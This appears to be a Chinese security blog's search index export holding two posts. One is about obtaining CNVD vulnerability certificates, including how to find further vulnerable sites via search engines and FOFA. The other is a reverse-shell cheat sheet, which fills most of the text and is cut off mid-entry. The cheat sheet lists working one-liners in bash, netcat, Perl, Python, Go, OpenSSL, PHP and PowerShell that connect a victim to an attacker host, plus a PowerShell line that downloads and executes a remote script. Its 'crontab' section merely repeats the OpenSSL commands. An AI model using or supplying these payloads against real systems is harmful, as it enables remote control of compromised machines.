<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CNVD证书获得及要求</title>
      <link href="/posts/19d2d8o8.html"/>
      <url>/posts/19d2d8o8.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>4月份利用闲时时间对学校资产进行了一波渗透测试，发现蛮多的漏洞，这其中就发现了这次证书的漏洞厂商，前不久证书也下来了，再加上有时间就对这次收获做一次总结。</p><h1 id="CNVD证书"><a href="#CNVD证书" class="headerlink" title="CNVD证书"></a>CNVD证书</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>  国家信息安全漏洞共享平台（China National Vulnerability Database，简称CNVD）是由国家计算机网络应急技术处理协调中心（中文简称国家互联应急中心，英文简称CNCERT）联合国内重要信息系统单位、基础电信运营商、网络安全厂商、软件厂商和互联网企业建立的国家网络安全漏洞库。这个证书就是对白帽子原创性贡献的证书证明，现在很多单位招聘安全人员都会优先考虑有漏洞挖掘实战经验的，有CNVD证书的更好。</p><h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><p>对于中危及中危以上通用型漏洞（CVSS2.0基准评分超过4.0分），以及涉及党政机关、重要行业单位、科研院所、重要企事业单位（如：中央国有大型企业、部委直属事业单位等）的高危事件型漏洞(后续对事件型漏洞证明颁发标准将参考中央网信办颁布的关键基础设施相关定义和分类)，CNVD将给予原创漏洞证明（即CNVD漏洞证书，电子版），该证明可通过编号在CNVD官方网站进行查询跟踪。时限要求：按周对上一周归档漏洞且满足证书颁发条件的进行批量制作。</p><p>事件型：高危 重要机构<br>通用型：中危及以上（评分4.0） 注册资金5000w以上，黑盒的测试案例10或以上（3复现+7其他案例，其他案例不要求复现），白盒的得有源码以及提供漏洞处代码调试过程，包含截图和原因。这里另外提一点，就是网络设备弱口令也可以，按黑盒要求来。</p><p>我这次既有白盒案例也有黑盒的，再加上一个弱口令，一共三本证书。黑盒得的证书一本是xx公司逻辑漏洞，另一本是弱口令，逻辑漏洞我复现4案例+13其他案例。弱口令的我是xx公司的多个网络设备弱口令总结，复现4案例+10其他案例，超过要求的10案例，这个当然是越多越好。白盒得的证书和逻辑漏洞的那家公司是同一个公司，白盒测试过程是找到漏洞点，分析漏洞成因，调试代码验证漏洞成因，提供截图和调试过程。不用写其他案例和黑盒测试案例了，免得审核误以为你是黑盒（我就是这样子，后面发邮件反馈了才给我下发证书）。</p><h1 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h1><h2 id="定位目标"><a href="#定位目标" class="headerlink" title="定位目标"></a>定位目标</h2><p>1、可以专门去找注册资金超过5000w的xx网络科技、xx软件公司，一般这种公司的产品站点下面都有技术支持：xx网络科技、xx软件，但是这个目标太过于庞大，我之前体验感觉不太好。<br>2、白盒代码审计，专门找大厂的cms来审计，这个适合审计功底比较好的。<br>3、挖edusrc，因为edusrc的对象就是学校，学校我们就不说了，数量远远超过我们的要求，很多的公司专门为学校提供各种系统，这些系统大多安全性不高，很容易挖，也容易找案例。</p><h2 id="搜索案例"><a href="#搜索案例" class="headerlink" title="搜索案例"></a>搜索案例</h2><p>1、利用百度，可以直接搜索系统名称<br>2、利用谷歌，谷歌hack语法，搜索标题、url、公司等关键内容<br>3、利用fofa，查看特征利用body查看案例<br>4、其他的搜索引擎，像搜狗、必应这些<br>5、漏洞厂商官网，有些会把顾客列出来</p><h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>中危：<br>像任意密码重置、越权、sql注入、绕过登录验证这些<br>高危：命令执行、文件上传等能拿shell的操作<br>提示：拿到shell的并且又找不到足够案例时可以转向白盒审计，很多管理员都会对源码进行备份，可以直接下载下来审计。</p><h2 id="证书展示"><a href="#证书展示" class="headerlink" title="证书展示"></a>证书展示</h2><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210522233044628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h3 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h3><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210522233107616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210522233132373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><p>至于漏洞复现过程我就不贴出来了，防止脱敏没做好，被有心人利用做出一些违法的事情。逻辑漏洞是绕过登录，白盒审计是文件上传漏洞，弱口令是xx公司的路由器。漏洞的话还是得慢慢积累，还有有一点运气，毕竟运气也是实力的一部分。</p><h1 id="ps："><a href="#ps：" class="headerlink" title="ps："></a>ps：</h1><p>个人站点博客：<a href="http://mirrors.ren/" target="_blank" rel="noopener">XingHe</a>，欢迎来踩~</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> cnvd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 证书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹Shell大全与原理</title>
      <link href="/posts/19d2a2lc.html"/>
      <url>/posts/19d2a2lc.html</url>
      
        <content type="html"><![CDATA[<h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹shell</h2><p>reverse shell（<strong>反弹shell</strong>），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准<a href="https://www.uedbox.com/?s=shell" target="_blank" rel="noopener">shell</a>对应，本质上是网络概念的客户端与服务端的角色反转。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://www.uedbox.com/wp-content/uploads/2019/04/Reverse-Shell.png" alt="反弹Shell大全与原理"></p><h2 id="为什么要反弹shell"><a href="#为什么要反弹shell" class="headerlink" title="为什么要反弹shell"></a>为什么要反弹shell</h2><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形</p><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？</p><ol><li>对方主机在局域网内，从外网无法直接访问。</li><li>对方主机上存在WAF，对主动连接发来的请求数据检测严格，而对向外发出的请求不进行检测或检测较少。</li><li>对方的ip会动态改变，你不能持续控制。</li><li>对方由于防火墙等限制，对方机器只能发送请求，不能接收请求。</li><li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</li></ol><p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。在渗透测试过程中，得到<a href="https://www.uedbox.com/?s=webshell" target="_blank" rel="noopener">webshell</a>后一般我们会<strong>反弹shell</strong>。</p><h2 id="反弹shell原理"><a href="#反弹shell原理" class="headerlink" title="反弹shell原理"></a>反弹shell原理</h2><ol><li>A主机开启9090端口的tcp服务</li><li>B主机连接到A主机的9090的tcp服务</li><li>A主机通过tcp服务把命令发到B主机</li><li>B主机读取命令并且在bash中执行</li><li>B主机把执行结果发给A主机</li></ol><p>这样就可以在A主机中’操控’B主机了</p><h2 id="反弹shell操作步骤"><a href="#反弹shell操作步骤" class="headerlink" title="反弹shell操作步骤"></a>反弹shell操作步骤</h2><ol><li>在本机开启并监听端口</li><li>在需要被控制的机器上执行反弹shell命令</li><li>在本机监听反弹shell的端口</li></ol><h2 id="反弹shell大全"><a href="#反弹shell大全" class="headerlink" title="反弹shell大全"></a>反弹shell大全</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://www.uedbox.com/wp-content/uploads/2019/04/reverse-shell.png" alt="反弹Shell大全与原理"></p><h3 id="Bash反弹shell"><a href="#Bash反弹shell" class="headerlink" title="Bash反弹shell"></a>Bash反弹shell</h3><pre class="line-numbers language-bash"><code class="language-bash">/bin/bash -c <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/x.x.x.x/12345 0<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Bash反弹shell-TCP"><a href="#Bash反弹shell-TCP" class="headerlink" title="Bash反弹shell TCP"></a>Bash反弹shell TCP</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/10.0.0.1/8080 0<span class="token operator">></span><span class="token operator">&amp;</span>10<span class="token operator">&lt;</span><span class="token operator">&amp;</span>196<span class="token punctuation">;</span><span class="token function">exec</span> 196<span class="token operator">&lt;</span><span class="token operator">></span>/dev/tcp/<span class="token operator">&lt;</span>your IP<span class="token operator">></span>/<span class="token operator">&lt;</span>same unfiltered port<span class="token operator">></span><span class="token punctuation">;</span> sh <span class="token operator">&lt;</span><span class="token operator">&amp;</span>196 <span class="token operator">></span><span class="token operator">&amp;</span>196 2<span class="token operator">></span><span class="token operator">&amp;</span>196<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Bash反弹shell-UDP"><a href="#Bash反弹shell-UDP" class="headerlink" title="Bash反弹shell UDP"></a>Bash反弹shell UDP</h3><pre class="line-numbers language-bash"><code class="language-bash">Victim:sh -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/udp/127.0.0.1/4242 0<span class="token operator">></span><span class="token operator">&amp;</span>1 Listener:nc -u -lvp 4242<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="NC反弹shell"><a href="#NC反弹shell" class="headerlink" title="NC反弹shell"></a>NC反弹shell</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mknod</span> backpipe p<span class="token punctuation">;</span> nc <span class="token operator">&lt;</span>attacker_ip<span class="token operator">></span> <span class="token operator">&lt;</span>port<span class="token operator">></span> 0<span class="token operator">&lt;</span>backpipe <span class="token operator">|</span> /bin/bash 1<span class="token operator">></span>backpipe <span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/sh -i 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span class="token operator">|</span>nc x.x.x.x 12388 <span class="token operator">></span>/tmp/f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="perl反弹shell"><a href="#perl反弹shell" class="headerlink" title="perl反弹shell"></a>perl反弹shell</h3><pre class="line-numbers language-perl"><code class="language-perl">perl <span class="token operator">-e</span> '<span class="token keyword">use</span> Socket<span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token string">"10.0.0.1"</span><span class="token punctuation">;</span><span class="token variable">$p</span><span class="token operator">=</span><span class="token number">1234</span><span class="token punctuation">;</span>socket<span class="token punctuation">(</span>S<span class="token punctuation">,</span>PF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">,</span>getprotobyname<span class="token punctuation">(</span><span class="token string">"tcp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>connect<span class="token punctuation">(</span>S<span class="token punctuation">,</span>sockaddr_in<span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">,</span>inet_aton<span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>open<span class="token punctuation">(</span>STDIN<span class="token punctuation">,</span><span class="token string">">&amp;S"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>open<span class="token punctuation">(</span>STDOUT<span class="token punctuation">,</span><span class="token string">">&amp;S"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>open<span class="token punctuation">(</span>STDERR<span class="token punctuation">,</span><span class="token string">">&amp;S"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>exec<span class="token punctuation">(</span><span class="token string">"/bin/sh -i"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>' perl <span class="token operator">-</span>MIO <span class="token operator">-e</span> '<span class="token variable">$p</span><span class="token operator">=</span>fork<span class="token punctuation">;</span>exit<span class="token punctuation">,</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span>new IO<span class="token punctuation">:</span><span class="token punctuation">:</span>Socket<span class="token punctuation">:</span><span class="token punctuation">:</span>INET<span class="token punctuation">(</span>PeerAddr<span class="token punctuation">,</span><span class="token string">"[IPADDR]:[PORT]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>STDIN<span class="token operator">-></span>fdopen<span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$~</span><span class="token operator">-></span>fdopen<span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>system<span class="token variable">$_</span> <span class="token keyword">while</span><span class="token filehandle symbol">&lt;></span><span class="token punctuation">;</span>'NOTE<span class="token punctuation">:</span> Windows only perl <span class="token operator">-</span>MIO <span class="token operator">-e</span> '<span class="token variable">$c</span><span class="token operator">=</span>new IO<span class="token punctuation">:</span><span class="token punctuation">:</span>Socket<span class="token punctuation">:</span><span class="token punctuation">:</span>INET<span class="token punctuation">(</span>PeerAddr<span class="token punctuation">,</span><span class="token string">"[IPADDR]:[PORT]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>STDIN<span class="token operator">-></span>fdopen<span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$~</span><span class="token operator">-></span>fdopen<span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>system<span class="token variable">$_</span> <span class="token keyword">while</span><span class="token filehandle symbol">&lt;></span><span class="token punctuation">;</span>' <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Python反弹shell"><a href="#Python反弹shell" class="headerlink" title="Python反弹shell"></a>Python反弹shell</h3><p>Linux</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">*</span><span class="token operator">//</span> 方法一<span class="token operator">*</span>$ python <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span class="token operator">*</span><span class="token operator">//</span> 方法二<span class="token operator">*</span>$ export RHOST<span class="token operator">=</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>export RPORT<span class="token operator">=</span><span class="token number">12345</span><span class="token punctuation">;</span>python <span class="token operator">-</span>c <span class="token string">'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Windows Python反弹shell</p><pre class="line-numbers language-python"><code class="language-python">C<span class="token punctuation">:</span>\Python27\python<span class="token punctuation">.</span>exe <span class="token operator">-</span>c <span class="token string">"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Golang反弹shell"><a href="#Golang反弹shell" class="headerlink" title="Golang反弹shell"></a>Golang反弹shell</h3><pre class="line-numbers language-go"><code class="language-go">echo <span class="token string">'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'</span> <span class="token operator">></span> <span class="token operator">/</span>tmp<span class="token operator">/</span>t<span class="token punctuation">.</span><span class="token keyword">go</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">go</span> run <span class="token operator">/</span>tmp<span class="token operator">/</span>t<span class="token punctuation">.</span><span class="token keyword">go</span> <span class="token operator">&amp;&amp;</span> rm <span class="token operator">/</span>tmp<span class="token operator">/</span>t<span class="token punctuation">.</span><span class="token keyword">go</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Ncat反弹shell"><a href="#Ncat反弹shell" class="headerlink" title="Ncat反弹shell"></a>Ncat反弹shell</h3><pre class="line-numbers language-bash"><code class="language-bash">ncat 127.0.0.1 4444 -e /bin/bashncat --udp 127.0.0.1 4444 -e /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="OpenSSL反弹shell"><a href="#OpenSSL反弹shell" class="headerlink" title="OpenSSL反弹shell"></a>OpenSSL反弹shell</h3><pre class="line-numbers language-ocaml"><code class="language-ocaml">openssl req <span class="token operator">-</span>x509 <span class="token operator">-</span>newkey rsa<span class="token punctuation">:</span><span class="token number">4096</span> <span class="token operator">-</span>keyout key<span class="token punctuation">.</span>pem <span class="token operator">-</span>out cert<span class="token punctuation">.</span>pem <span class="token operator">-</span>days <span class="token number">365</span> <span class="token operator">-</span>nodesopenssl s<span class="token punctuation">_</span>server <span class="token operator">-</span>quiet <span class="token operator">-</span>key key<span class="token punctuation">.</span>pem <span class="token operator">-</span>cert cert<span class="token punctuation">.</span>pem <span class="token operator">-</span>port <span class="token number">4242</span>ncat <span class="token operator">--</span>ssl <span class="token operator">-</span>vv <span class="token operator">-</span>l <span class="token operator">-</span>p <span class="token number">4242</span> mkfifo <span class="token operator">/</span>tmp<span class="token operator">/</span>s<span class="token punctuation">;</span> <span class="token operator">/</span>bin<span class="token operator">/</span>sh <span class="token operator">-</span>i <span class="token operator">&lt;</span> <span class="token operator">/</span>tmp<span class="token operator">/</span>s <span class="token number">2</span><span class="token operator">>&amp;</span><span class="token number">1</span> \<span class="token operator">|</span> openssl s<span class="token punctuation">_</span>client <span class="token operator">-</span>quiet <span class="token operator">-</span>connect <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">4242</span> <span class="token operator">></span> <span class="token operator">/</span>tmp<span class="token operator">/</span>s<span class="token punctuation">;</span> rm <span class="token operator">/</span>tmp<span class="token operator">/</span>s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="crontab反弹shell"><a href="#crontab反弹shell" class="headerlink" title="crontab反弹shell"></a>crontab反弹shell</h3><pre class="line-numbers language-bash"><code class="language-bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodesopenssl s_server -quiet -key key.pem -cert cert.pem -port 4242ncat --ssl -vv -l -p 4242 <span class="token function">mkfifo</span> /tmp/s<span class="token punctuation">;</span> /bin/sh -i <span class="token operator">&lt;</span> /tmp/s 2<span class="token operator">></span><span class="token operator">&amp;</span>1 \<span class="token operator">|</span> openssl s_client -quiet -connect 127.0.0.1:4242 <span class="token operator">></span> /tmp/s<span class="token punctuation">;</span> <span class="token function">rm</span> /tmp/s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="PHP反弹shell"><a href="#PHP反弹shell" class="headerlink" title="PHP反弹shell"></a>PHP反弹shell</h3><pre class="line-numbers language-php"><code class="language-php">php <span class="token operator">-</span>r '<span class="token variable">$sock</span><span class="token operator">=</span><span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token string">"10.0.0.1"</span><span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Powershell反弹shell"><a href="#Powershell反弹shell" class="headerlink" title="Powershell反弹shell"></a>Powershell反弹shell</h3><pre class="line-numbers language-powershell"><code class="language-powershell">powershell <span class="token operator">-</span>NoP <span class="token operator">-</span>NonI <span class="token operator">-</span>W Hidden <span class="token operator">-</span>Exec Bypass <span class="token operator">-</span>Command <span class="token operator">*</span><span class="token operator">*</span>New*<span class="token operator">*</span>-<span class="token operator">*</span><span class="token operator">*</span>Object*<span class="token operator">*</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TCPClient<span class="token punctuation">(</span><span class="token string">"[IPADDR]"</span><span class="token punctuation">,</span><span class="token namespace">[PORT]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span> = <span class="token variable">$client</span><span class="token punctuation">.</span>GetStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token operator">*</span>byte*<span class="token operator">*</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token variable">$bytes</span> = 0<span class="token punctuation">.</span><span class="token punctuation">.</span>65535\<span class="token punctuation">|</span><span class="token operator">%</span><span class="token punctuation">{</span>0<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token operator">*</span><span class="token keyword">while</span>*<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$i</span> = <span class="token variable">$stream</span><span class="token punctuation">.</span>Read<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$bytes</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token variable">$data</span> = <span class="token punctuation">(</span><span class="token operator">*</span><span class="token operator">*</span>New*<span class="token operator">*</span>-<span class="token operator">*</span><span class="token operator">*</span>Object*<span class="token operator">*</span> <span class="token operator">-</span>TypeName System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>ASCIIEncoding<span class="token punctuation">)</span><span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback</span> = <span class="token punctuation">(</span><span class="token function">iex</span> <span class="token variable">$data</span> 2>&amp;1 \<span class="token punctuation">|</span> Out-<span class="token operator">*</span><span class="token operator">*</span>String*<span class="token operator">*</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback2</span> = <span class="token variable">$sendback</span> <span class="token operator">+</span> <span class="token string">"PS "</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">pwd</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Path <span class="token operator">+</span> <span class="token string">"> "</span><span class="token punctuation">;</span><span class="token variable">$sendbyte</span> = <span class="token punctuation">(</span><span class="token namespace">[text.encoding]</span>::ASCII<span class="token punctuation">)</span><span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token variable">$sendback2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span><span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token variable">$sendbyte</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span><span class="token variable">$sendbyte</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span><span class="token punctuation">.</span>Flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token variable">$client</span><span class="token punctuation">.</span>Close<span class="token punctuation">(</span><span class="token punctuation">)</span> powershell <span class="token operator">-</span>nop <span class="token operator">-</span>c <span class="token string">"<span class="token variable">$client</span> = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);<span class="token variable">$stream</span> = <span class="token variable">$client</span>.GetStream();[byte[]]<span class="token variable">$bytes</span> = 0..65535\|%{0};while((<span class="token variable">$i</span> = <span class="token variable">$stream</span>.Read(<span class="token variable">$bytes</span>, 0, <span class="token variable">$bytes</span>.Length)) -ne 0){;<span class="token variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="token variable">$bytes</span>,0, <span class="token variable">$i</span>);<span class="token variable">$sendback</span> = (iex <span class="token variable">$data</span> 2>&amp;1 \| Out-String );<span class="token variable">$sendback2</span> = <span class="token variable">$sendback</span> + 'PS ' + (pwd).Path + '> ';<span class="token variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="token variable">$sendback2</span>);<span class="token variable">$stream</span>.Write(<span class="token variable">$sendbyte</span>,0,<span class="token variable">$sendbyte</span>.Length);<span class="token variable">$stream</span>.Flush()};<span class="token variable">$client</span>.Close()"</span>powershell <span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Ruby反弹shell"><a href="#Ruby反弹shell" class="headerlink" title="Ruby反弹shell"></a>Ruby反弹shell</h3><pre class="line-numbers language-ruby"><code class="language-ruby">ruby <span class="token operator">-</span>rsocket <span class="token operator">-</span>e<span 